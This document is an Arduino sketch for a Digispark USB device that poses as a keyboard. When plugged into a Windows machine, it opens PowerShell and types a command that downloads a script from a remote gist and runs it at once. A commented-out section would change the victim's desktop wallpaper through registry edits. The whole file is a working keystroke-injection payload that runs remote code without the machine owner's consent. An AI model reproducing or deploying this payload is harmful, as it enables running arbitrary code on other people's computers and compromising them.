#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

void setup() {
  DigiKeyboard.update();
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // meta+r
  delay(50);
  DigiKeyboard.println(F("powershell"));
  delay(400);
  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/whoismath/a965e49313498b3ab4ef5a020ab573e7/raw/0ff6eda7549cffe074773840ea0bb3d8ab64fee8/change.ps1')"));  
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  /*DigiKeyboard.print(F("$client = New-Object System.Net.WebClient"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("$client.DownloadFile(\"http://www.indiewire.com/wp-content/uploads/2017/07/rick-and-morty.png\" , \"rick-and-morty.png\")"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("Set-ItemProperty -path \'HKCU:\\Control Panel\\Desktop\' -name wallpaper -value \"%USERPROFILE%\\rick-and-morty.png\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("Set-ItemProperty -path \'HKCU:\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\' -name wallpaper -value \"%USERPROFILE%\\rick-and-morty.png\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("rundll32.exe user32.dll, UpdatePerUserSystemParameters"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);*/
  for(;;){ /*empty*/ }
}
